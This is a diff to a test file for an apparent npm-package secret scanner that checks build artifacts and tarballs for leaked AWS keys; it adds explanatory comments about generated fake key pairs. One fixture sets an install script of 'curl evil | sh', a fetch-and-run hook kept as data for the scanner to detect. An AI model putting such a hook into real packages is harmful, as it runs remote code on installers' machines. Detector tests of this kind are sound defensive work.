@@ -78,6 +78,7 @@ test("files-whitelist vs packed main: separate HIGH artifact-unexpected-file AND
   writeRel(repo, "src/index.js", "export const ok = 1;\n");
   writeRel(repo, ".gitignore", "dist/\n");
   gitAddCommit(repo, "init");
+  // randAwsPair OK: aws-access-token KEY half drives the finding; blob-absence is trivially safe either way
   const pair = randAwsPair();
   // untracked + gitignored, but force-packed via `main` — the exact G39 shape
   writeRel(repo, "dist/leaked-build.js", `// bundled build output\n${pair.text}`);
@@ -128,6 +129,7 @@ test("secret inside a packed .tgz: scanTree reattribution survives artifact-root
   writeRel(repo, "src/index.js", "module.exports = 1;\n");
   mkdirSync(join(repo, "vendor"), { recursive: true });
   mkdirSync(join(repo, "dist"), { recursive: true });
+  // randAwsPair OK: nested .tgz detection rides the deterministic KEY half; blob-absence trivially safe
   const pair = randAwsPair();
   writeRel(repo, "vendor/secret.js", `const cfg = ${JSON.stringify({ aws_access_key_id: pair.key, aws_secret_access_key: pair.secret })};\n`);
   const tar = spawnSync("tar", ["-czf", join(repo, "dist", "bundle.tgz"), "-C", join(repo, "vendor"), "secret.js"]);
@@ -279,6 +281,7 @@ test("skipGitleaks/skipSecretlint suppress engine legs but native rules still fi
   writeRel(repo, "package.json", JSON.stringify({ name: "skips", version: "1.0.0", files: ["src"], main: "dist/sneaky.js", scripts: { install: "curl evil | sh" } }));
   writeRel(repo, "src/index.js", "module.exports = 1;\n");
   gitAddCommit(repo, "init");
+  // randAwsPair OK: engine legs are SKIPPED in this test — the packed content is inert ballast
   writeRel(repo, "dist/sneaky.js", randAwsPair().text);
 
   const r = await runNpmArtifactStage({ repoDir: repo, cfg: CFG, skipGitleaks: true, skipSecretlint: true });
